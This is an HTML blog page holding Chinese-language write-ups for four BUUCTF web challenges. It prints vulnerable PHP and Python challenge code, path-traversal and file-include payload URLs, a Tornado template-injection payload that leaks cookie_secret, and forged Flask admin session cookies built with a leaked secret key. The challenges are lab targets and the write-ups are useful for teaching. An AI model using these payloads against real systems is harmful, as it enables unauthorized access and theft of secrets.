@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="BUUCTF web writeup 记录 不定期更新">
+<meta name="keywords" content="ctf,web,buuctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF web writeup 记录">
+<meta property="og:url" content="https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/index.html">
+<meta property="og:site_name" content="Six&#39;s Blog">
+<meta property="og:description" content="BUUCTF web writeup 记录 不定期更新">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.loli.net/2019/08/18/3dUqBKvE4LugC5G.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/20/mJfTgA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/20/mJoUFf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/20/mJo4l4.png">
+<meta property="og:updated_time" content="2019-12-05T14:06:35.515Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BUUCTF web writeup 记录">
+<meta name="twitter:description" content="BUUCTF web writeup 记录 不定期更新">
+<meta name="twitter:image" content="https://i.loli.net/2019/08/18/3dUqBKvE4LugC5G.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>BUUCTF web writeup 记录</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/09/12/node2vec学习笔记/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/06/05/计网实验之访问控制列表/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&text=BUUCTF web writeup 记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&title=BUUCTF web writeup 记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&is_video=false&description=BUUCTF web writeup 记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF web writeup 记录&body=Check out this article: https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&title=BUUCTF web writeup 记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&title=BUUCTF web writeup 记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&title=BUUCTF web writeup 记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&title=BUUCTF web writeup 记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&name=BUUCTF web writeup 记录&description=&lt;p&gt;BUUCTF web writeup 记录 不定期更新&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&t=BUUCTF web writeup 记录"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#warmup"><span class="toc-number">1.</span> <span class="toc-text">warmup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#De1CTF-2019-SSRF-Me"><span class="toc-number">2.</span> <span class="toc-text">[De1CTF 2019]SSRF Me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-tornado"><span class="toc-number">3.</span> <span class="toc-text">easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#admin"><span class="toc-number">4.</span> <span class="toc-text">admin</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF web writeup 记录
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Six's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-09-11T16:00:00.000Z" itemprop="datePublished">2019-09-12</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/安全技术/">安全技术</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/buuctf/">buuctf</a>, <a class="tag-link" href="/tags/ctf/">ctf</a>, <a class="tag-link" href="/tags/web/">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>BUUCTF web writeup 记录 不定期更新</p>
+<a id="more"></a>
+<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>进入页面，F12源码，发现提示<br><img src="https://i.loli.net/2019/08/18/3dUqBKvE4LugC5G.png" alt="UTOOLS1566108503497.png"></p>
+<p>访问<code>source.php</code>，得到源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&apos;file&apos;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>从源码中发现了<code>hint.php</code>。</p>
+<p>访问该文件，返回 <code>flag not here, and flag in ffffllllaaaagggg</code>。</p>
+<p>得到<code>flag</code>，所在位置。</p>
+<p>审计得到的源码。</p>
+<p>由源码可知，存在<code>PhpMyadmin4.81文件包含的CVE</code>，具体分析可见这篇<a href="http://www.lmxspace.com/2018/06/23/phpmyadmin-4-8-1-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">文章</a>。</p>
+<p>构造payload:</p>
+<p><code>http://e94cb492-d91a-463b-98a2-bd1d97fbd65d.node1.buuoj.cn/?file=source.php?../../../../../ffffllllaaaagggg</code>。</p>
+<p>得到flag。</p>
+<p>原理分析：结合CVE和得到的代码，外面知道，通过在<code>file</code>参数中利用白名单文件加<code>?</code>就可实现绕过，那么最终<code>include</code>得到的参数就是<code>source.php?../../../../../ffffllllaaaagggg</code>，在执行包含文件时，解析器将<code>source.php?</code>看作是一个目录（虽然这个目录是不存在的），所以在后面添加<code>../</code>来跳出目录。【这里还有问题，需要再考虑下，<code>include</code>是如何解析目录的】</p>
+<p>总结：</p>
+<ul>
+<li>PhpMyadmin4.81文件包含的CVE</li>
+<li>不安全的使用 in_array() 函数<blockquote>
+<p>in_array ：(PHP 4, PHP 5, PHP 7)</p>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<p>功能 ：检查数组中是否存在某个值<br>定义 ： bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )<br>在 $haystack 中搜索 $needle ，如果第三个参数 $strict 的值为 TRUE ，则 in_array()函数会进行强检查，检查 $needle 的类型是否和 $haystack 中的相同。如果找到 $haystack ，则返回 TRUE，否则返回 FALSE。</p>
+</blockquote>
+<blockquote>
+<p>PHP在使用 in_array() 函数判断时，会将 7shell.php 强制转换成数字7,如果7在白名单中，就可以实现绕过。</p>
+</blockquote>
+<h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><p>官方给出的解法是：Hash Length Extension Attacks+CVE-2019-9948(urllib)</p>
+<p>但是不通过长度扩展攻击也可以实现攻击。</p>
+<p>访问目标网页，得到源码。<br>对源码进行审计，发现存在hash长度扩展攻击。同时需要绕过的点有：<code>waf()</code>中对输入的限制，<code>sign()</code>的验证。</p>
+<p><code>waf()</code>中对输入进行了黑名单限制。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def waf(param):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure></p>
+<p>对于<code>sign()</code>的验证，首先看一下是如何生成签名的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure></p>
+<p>签名由三部分组成，<code>secert_key</code>、<code>action</code>和<code>param</code>，并且，在代码中固定了<code>action</code>为<code>scan</code>，这里可以通过hash成都扩展攻击进行伪造目标签名。但是下面的代码可以让我们不用使用长度扩展，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">def Exec(self):</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[&apos;code&apos;] = 500</span><br><span class="line">    if (self.checkSign()):</span><br><span class="line">        if &quot;scan&quot; in self.action:</span><br><span class="line">            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                result[&apos;data&apos;] = resp</span><br><span class="line">            else:</span><br><span class="line">                print resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[&apos;code&apos;] = 200</span><br><span class="line">        if &quot;read&quot; in self.action:</span><br><span class="line">            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)</span><br><span class="line">            result[&apos;code&apos;] = 200</span><br><span class="line">            result[&apos;data&apos;] = f.read()</span><br><span class="line">        if result[&apos;code&apos;] == 500:</span><br><span class="line">            result[&apos;data&apos;] = &quot;Action Error&quot;</span><br><span class="line">    else:</span><br><span class="line">        result[&apos;code&apos;] = 500</span><br><span class="line">        result[&apos;msg&apos;] = &quot;Sign Error&quot;</span><br><span class="line">    return result</span><br></pre></td></tr></table></figure></p>
+<p>这里对<code>action</code>的比对采用的<code>in</code>，所以只要<code>action</code>中存在就可以，所以<code>scanread</code>就可以实现对<code>read</code>的访问。</p>
+<p><strong>方法一</strong></p>
+<p>使用<code>action = readscan</code>绕过对方法的限制。</p>
+<p>首先要生成目标的签名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c0d08819-abcd-4e9b-8f13-144468ba9f37.node1.buuoj.cn/geneSign?params=flag.txtread</span><br></pre></td></tr></table></figure></p>
+<p>之后设置<code>action = readscan</code>,<code>params = flag.txt</code>,<code>sing</code>为获得的签名，即可得到<code>flag</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cookie=&#123;</span><br><span class="line">        &quot;action&quot;:action,</span><br><span class="line">        &quot;sign&quot;:sign</span><br><span class="line">    &#125;</span><br><span class="line">    params=&#123;</span><br><span class="line">        &quot;param&quot;:param</span><br><span class="line">    &#125;</span><br><span class="line">    resp = conn.get(&quot;http://c0d08819-abcd-4e9b-8f13-144468ba9f37.node1.buuoj.cn&quot;,params=params,cookies=cookie)</span><br></pre></td></tr></table></figure>
+<p><strong>方法二</strong></p>
+<p>利用hash长度扩展得到签名。</p>
+<p>见解析：<a href="https://www.jianshu.com/p/0a02f4ff6a7e" target="_blank" rel="noopener">https://www.jianshu.com/p/0a02f4ff6a7e</a></p>
+<h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h3><ul>
+<li>模板注入</li>
+</ul>
+<p>进入页面发现三个<code>txt</code>文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">/welcome.txt</span><br><span class="line">/hints.txt</span><br></pre></td></tr></table></figure></p>
+<p><code>flag.txt</code>中提示<code>flag in /fllllllllllllag</code>。得知<code>flag</code>所在的位置。</p>
+<p><code>welcome.txt</code> 中提示<code>render</code>。<code>render</code>为python中的一个模板，猜测模板注入。</p>
+<p><code>hints.txt</code>中提示<code>md5(cookie_secret+md5(filename))</code>。得知加密组合方式，<code>cookie_secret</code>为<code>tornado</code>中为保障<code>cookie</code>安全设置的一个加密参数。</p>
+<p>通过提示我们可以知道，我们现在需要读取<code>fllllllllllllag</code>文件，但需要计算对应的<code>hash</code>值，计算方式已经知道，但是不知道<code>cookie_secret</code>，接下来想办法找到它。</p>
+<p>通过<code>welcome.txt</code>中的<code>render</code>，考虑模板注入。测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d9a55738-1b14-41a4-b23b-03d62ea70383.node1.buuoj.cn/error?msg=&#123;&#123;8&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>页面显示8，说明存在模板注入。</p>
+<p>通过查询，得知，<code>tornado</code>的<code>cookie_secret</code>在<code>handler.settings</code>中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d9a55738-1b14-41a4-b23b-03d62ea70383.node1.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>得到<code>cookie_secret</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;autoreload&apos;: True, &apos;compiled_template_cache&apos;: False, &apos;cookie_secret&apos;: &apos;188edef1-0e52-409a-9874-a9b2905d5f39&apos;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>利用<code>cookie_secret</code>，计算<code>/fllllllllllllag</code>的hash值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(188edef1-0e52-409a-9874-a9b2905d5f39+md5(/fllllllllllllag))</span><br></pre></td></tr></table></figure></p>
+<p>得到：<code>2b70c795705f51bfb567595b1fed2cd5</code>。</p>
+<p>最终<code>payload</code>:<code>/file?filename=/fllllllllllllag&amp;filehash=2b70c795705f51bfb567595b1fed2cd5</code>。</p>
+<h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><blockquote>
+<p>HCTF 2018 admin</p>
+<ul>
+<li>session 伪造</li>
+<li>代码审计</li>
+<li>Unicode伪造</li>
+</ul>
+</blockquote>
+<p>访问页面，发现有注册登录。注册账户，进行登录。</p>
+<p>登陆后为欢迎页面，发现有几个页面，浏览查看。</p>
+<p>浏览每个页面的源码。</p>
+<p><code>index</code>页面源码发现，提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- you are not admin --&gt;</span><br></pre></td></tr></table></figure></p>
+<p><code>flag</code>应该在管理员页面中。<br>在<code>change</code>页面，发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span><br></pre></td></tr></table></figure></p>
+<p> 发现后台代码。</p>
+<p> 进行代码审计，存在数据库文件<code>user.sql</code>,在里面发现<code>admin</code>的信息，<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> INSERT INTO `user` (`id`, `email`, `password_hash`, `username`) VALUES</span><br><span class="line">(1, NULL, &apos;pbkdf2:sha1:1000$HHGfbouP$eaa88f64aad0dd3f81a72c16337c03cd1bdc6be1&apos;, &apos;admin&apos;),</span><br><span class="line">(2, NULL, &apos;pbkdf2:sha1:1000$ErwOESOB$f61a07b6836fab26e885f0dd5419b0f75ea5bf96&apos;, &apos;ckj123&apos;);</span><br></pre></td></tr></table></figure></p>
+<p><code>admin</code>账户的<code>id</code>为<code>1</code>。在之后实验中，发现其实没有对用户<code>id</code>进行验证。</p>
+<p>在模板文件<code>index.html</code>，发现输出<code>flag</code>的条件，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if current_user.is_authenticated and session[&apos;name&apos;] == &apos;admin&apos; %&#125;</span><br><span class="line">&lt;h1 class=&quot;nav&quot;&gt;hctf&#123;xxxxxxxxx&#125;&lt;/h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>current_user.is_authenticated</code>是<code>flask_login</code>中的用户管理的方法，同时还校验<code>session</code>中的<code>name</code>是否是<code>admin</code>。</p>
+<p><code>flask</code>把<code>session</code>存在客户端的，而且只经过<code>base64</code>编码和用密钥签名，所以只要知道<code>key</code>就可以伪造<code>session</code>。</p>
+<p>但伪造<code>session</code>还需要知道<code>key</code>。在<code>config.py</code>中发现了<code>key</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = os.environ.get(&apos;SECRET_KEY&apos;) or &apos;ckj123&apos;</span><br></pre></td></tr></table></figure></p>
+<p>整体思路是伪造<code>session</code>，只要伪造了<code>session</code>就可以获得<code>flag</code>，但看到还有更改密码的功能，我们还可以通过伪造<code>session</code>修改<code>admin</code>的密码，进行登录。</p>
+<p>关于<code>falsk</code>的<code>session</code>的解码和编码可以通过<code>https://github.com/noraj/flask-session-cookie-manager</code>的脚本来实现，<code>python2</code>和<code>python3</code>有些差别，要选择对应的脚本。</p>
+<p>现在伪造<code>session</code>，模拟管理员登录。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS D:\six\script&gt; python .\session_decode.py .eJxFkMGKwkAMhl9lydmDtjsXwUOXusVCUipTS-YirlbbdKpQFdsR331nvewp8H_wJ1-esD321b</span><br><span class="line">WG-a2_VxPYNgeYP-HjB-aAQTHNSgyNmDpLeIqSK4pTIWeEXRRmST6gow7jveIgHyjYND4fSVixXo6eK5JNgzpylBQhxXVD5TL0PEQpHqZMLTpUpNsR5TSwWw</span><br><span class="line">0sXxZ1-4kl-XmwJjGWJK2NRAo1OhOnHQs1lHzX6NZNptmxRAt4TWB_7Y_b26Wtzv8KsV8QFP6UdUfOWtZ_Vashi08zr_Tw3Cu1ymeB0fnAJY8ULd51511X-Y</span><br><span class="line">q6svYCE7hfq_79HZhN4fULsLRmNw.XVu4tw.EHQ7UQuqgmXQIYvy1lvd_atJnVo</span><br><span class="line">&#123;&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;3e49c7f6a8f424942c76cc078d133f079cd17ebc02669a128d965b1034e748b5a7667250ebe339592281c21b0e1981ce17edfe62af09133d2fb3b4aa34b963b0&apos;, &apos;csrf_token&apos;: b&apos;0333e28df79ea2af218858f0039499f26e41af24&apos;, &apos;name&apos;: &apos;hello&apos;, &apos;user_id&apos;: &apos;10&apos;&#125;</span><br></pre></td></tr></table></figure>
+<p>解码获得的<code>session</code>，这里没有使用上面的脚本，自己实现了简单的解码。</p>
+<p>伪造数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;3e49c7f6a8f424942c76cc078d133f079cd17ebc02669a128d965b1034e748b5a7667250ebe339592281c21b0e1981ce17edfe62af09133d2fb3b4aa34b963b0&apos;, &apos;csrf_token&apos;: b&apos;0333e28df79ea2af218858f0039499f26e41af24&apos;, &apos;name&apos;: &apos;admin&apos;, &apos;user_id&apos;: &apos;1&apos;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>编码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJxFkE2LwkAMhv_KkrMHbXcugocudYuFpFSmlsxF_Kh20taFqtiO-N931sueAu8Db_LkCdtTX11rmN_6ezWBrT3C_Akfe5gDBsU0KzE0Yuos4SlKrihOhZwRdlGYJfmAjjqMD4qDfKBgY30-krBivRw9VyQbizpylBQhxbWlchl6HqIUD1OmLTpUpJsR5TywWw0sXy3q5hNL8vPYmsS0JGltJFKo0Zk47VjIUvJdo1vbTLNjiRbwmsDh2p-2t5-muvwrxH5BUPhT1h25tmX9V7Uasvg880oPz71So3wWGJ0PXPJI0eJdd9l1la_YHTt7gQncr1X__g7M4PULSeFl_A.XVu5jA.OYs-8-R6ZSWmCJssYk3OmHbiQCc</span><br></pre></td></tr></table></figure></p>
+<p>得到<code>flag</code>：<br><img src="https://s2.ax1x.com/2019/08/20/mJfTgA.png" alt="mJfTgA.png"><br><strong>修改密码</strong></p>
+<p>在修改密码时将<code>session</code>，更改为伪造的，修改密码成功。<br><a href="https://imgchr.com/i/mJoUFf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/20/mJoUFf.png" alt="mJoUFf.png"></a><br><code>admin</code>登录成功。<br><img src="https://s2.ax1x.com/2019/08/20/mJo4l4.png" alt="mJo4l4.png"></p>
+<blockquote>
+<p>不定期更新</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
